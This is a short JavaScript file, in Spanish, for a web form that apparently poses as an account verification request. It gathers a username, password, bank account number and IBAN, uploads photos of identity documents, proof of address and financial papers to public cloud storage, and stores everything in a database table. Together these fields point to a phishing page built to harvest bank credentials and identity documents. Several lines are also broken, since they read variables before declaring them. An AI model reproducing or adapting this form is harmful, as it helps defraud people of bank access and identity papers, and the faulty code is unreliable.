const SUPABASE_URL = "https://iomxopcdoygphvulaswb.supabase.co";
const SUPABASE_KEY = "sb_publishable_4KqCEnqLVSEETOob_X9c7w_4IOpToI-";

const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

const formulario = document.getElementById("formulario");
const boton = document.getElementById("boton");
const mensaje = document.getElementById("mensaje");

function mostrarMensaje(texto, tipo) {
  mensaje.textContent = texto;
  mensaje.className = tipo;
  mensaje.style.display = "block";
}

async function subirImagen(archivo, carpeta) {
  const nombre = `${carpeta}/${Date.now()}_${archivo.name}`;

  const { data, error } = await supabase.storage
    .from("verificaciones")
    .upload(nombre, archivo);

  if (error) return null;

  const { data: urlData } = supabase.storage
    .from("verificaciones")
    .getPublicUrl(nombre);

  return urlData.publicUrl;
}

formulario.addEventListener("submit", async (e) => {
  e.preventDefault();

  boton.disabled = true;
  boton.textContent = "Enviando...";
  mensaje.style.display = "none";

  const usuario = usuario.value.trim();
  const password = password.value.trim();
  const cuenta = cuenta.value.trim();
  const iban = iban.value.trim();

  const frontal = document.getElementById("frontal").files[0];
  const trasera = document.getElementById("trasera").files[0];
  const domicilio = document.getElementById("domicilio").files[0];
  const finanzas = document.getElementById("finanzas").files[0];

  const frontal_url = await subirImagen(frontal, "frontal");
  const trasera_url = await subirImagen(trasera, "trasera");
  const domicilio_url = await subirImagen(domicilio, "domicilio");
  const finanzas_url = await subirImagen(finanzas, "finanzas");

  const registro = {
    usuario,
    password,
    cuenta,
    iban,
    frontal_url,
    trasera_url,
    domicilio_url,
    finanzas_url,
    estado: "Pendiente",
  };

  const { error } = await supabase
    .from("usuario_verificaciones")
    .insert([registro]);

  if (error) {
    mostrarMensaje("Error al enviar la solicitud.", "error");
  } else {
    mostrarMensaje("Solicitud enviada correctamente.", "exito");
    formulario.reset();
  }

  boton.disabled = false;
  boton.textContent = "Enviar solicitud";
});
